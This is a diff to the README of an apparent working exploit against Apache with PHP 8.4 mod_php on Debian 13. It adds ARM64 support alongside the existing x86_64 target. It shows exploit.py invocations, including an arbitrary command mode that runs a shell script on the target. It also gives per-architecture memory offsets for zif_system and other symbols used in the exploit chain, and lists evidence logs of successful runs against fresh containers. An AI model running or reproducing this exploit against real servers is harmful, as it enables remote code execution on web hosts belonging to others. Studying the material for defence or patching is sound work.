@@ -70,6 +70,9 @@ python3 exploit.py --port 18110 --restart p2s-pure-18110
 # Official workers are the default; --workers 1 is for a --single target
 python3 exploit.py --port 18110 --workers 1
 
+# Native ARM64 target (x86_64 remains the default)
+python3 exploit.py --arch aarch64 --port 18110 --workers 1
+
 # Arbitrary command: write a script into the mounted directory, then run sh
 printf 'id; uname -a > /out/p1\n' > out/c
 python3 exploit.py --port 18110 --cmd 'sh</out/c'
@@ -112,13 +115,15 @@ chunked multipart plus ordinary GET/POST:
 
 Offsets (this build, ASLR-independent):
 
-| Symbol/location | Value |
-|---|---|
-| `zval_ptr_dtor` | `libphp+0x65EB60` |
-| `zif_system` | `libphp+0x465370` |
-| fake array `S` | `main+0xF8398` |
-| A2 `hsv` | `main+0x7D720` |
+| Symbol/location | x86_64 | aarch64 |
+|---|---|---|
+| leaked `zval_ptr_dtor` pointer | `libphp+0x65EB60` | `libphp+0x63812B` |
+| `zif_system` | `libphp+0x465370` | `libphp+0x42CD70` |
+| fake array `S` | `main+0xF8398` | `main+0xF8398` |
+| A2 `hsv` | `main+0x7D720` | `main+0x7D720` |
 
+The aarch64 ELF symbol for `zval_ptr_dtor` is at `0x638120`; the repeated
+pointer in this leak is 11 bytes later, so the profile subtracts `0x63812B`.
 Target environment: Debian 13 (trixie), Apache 2.4.69 prefork, PHP 8.4.26
 NTS mod_php, files session handler. A different PHP build/version needs
 fresh offsets; ASLR changes per container start, and the two leaks in the
@@ -131,6 +136,8 @@ chain derive it at runtime.
 - Debug-image batch log: [pure/evidence/pwn_pure_batch_20261022.log](pure/evidence/pwn_pure_batch_20261022.log)
 - Official-image log: [pure/evidence/pwn_pure_official_20261022.log](pure/evidence/pwn_pure_official_20261022.log)
 - Official-worker log: [pure/evidence/official_workers_20261022.log](pure/evidence/official_workers_20261022.log)
+- Native ARM64 stock-image log (10/10 fresh containers): [pure/evidence/arm64_stock_20261023.log](pure/evidence/arm64_stock_20261023.log)
+- Native ARM64 official-worker log (3/3 fresh containers): [pure/evidence/arm64_official_workers_20261023.log](pure/evidence/arm64_official_workers_20261023.log)
 - Proof: [pure/evidence/pwn_pure_proof_p1.txt](pure/evidence/pwn_pure_proof_p1.txt)
 
 ## Legacy (not the target)
